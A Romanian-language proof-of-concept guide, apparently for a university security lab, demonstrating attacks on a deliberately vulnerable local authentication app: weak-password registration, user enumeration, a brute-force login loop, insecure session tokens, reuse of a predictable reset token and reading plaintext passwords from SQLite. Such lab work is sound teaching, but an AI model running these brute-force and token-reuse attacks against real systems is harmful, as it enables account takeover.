# PoC - Atacuri pe varianta vulnerabila (v1)

Ruleaza aplicatia v1 pe portul 5000.

```bash
cd ~/DASS/vulnerable
python3 app.py
```

## 1. Register cu parola slaba (4.1)

```bash
curl -i -X POST http://127.0.0.1:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","email":"alice@example.com","password":"123"}'
```

Rezultat asteptat:
- cont creat cu parola foarte slaba

## 2. User enumeration la login (4.4)

```bash
curl -i -X POST http://127.0.0.1:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"no_such_user","password":"anything"}'
```

```bash
curl -i -X POST http://127.0.0.1:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"wrong"}'
```

Rezultat asteptat:
- mesaje diferite: `User does not exist` vs `Wrong password`

## 3. Brute force fara limitare (4.3)

Script simplu (bash):

```bash
for p in 0000 1111 123 admin qwerty; do
  curl -s -X POST http://127.0.0.1:5000/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"alice\",\"password\":\"$p\"}"
done
```

Rezultat asteptat:
- nelimitat, fara lock cont

## 4. Sesiune nesigura / token predictibil (4.5)

Login corect:

```bash
curl -i -c cookies_v1.txt -X POST http://127.0.0.1:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"123"}'
```

Rezultat asteptat:
- token vizibil in raspuns (format `username-timestamp`)
- cookie fara `HttpOnly`, fara `SameSite`, fara `Secure`

## 5. Reset parola vulnerabil (4.6)

Genereaza token:

```bash
curl -i -X POST http://127.0.0.1:5000/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"alice"}'
```

Foloseste token predictibil:

```bash
curl -i -X POST http://127.0.0.1:5000/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token":"reset-1","new_password":"new123"}'
```

Repeta aceeasi cerere inca o data cu acelasi token.

Rezultat asteptat:
- token reutilizabil
- fara expirare

## 6. Vizualizare date sensibile din DB (4.2)

In SQLite, parolele se vad in clar:

```bash
python - << 'PY'
import sqlite3
conn = sqlite3.connect('authx_vulnerable.db')
rows = conn.execute('SELECT id, username, password_plaintext FROM users').fetchall()
print(rows)
conn.close()
PY
```

Rezultat asteptat:
- parole in clar in DB

## Capturi obligatorii pentru raport

Pentru fiecare pas de mai sus, captureaza:
- comanda completa
- request/response complet
- username in terminal
- hostname VM
- data/ora
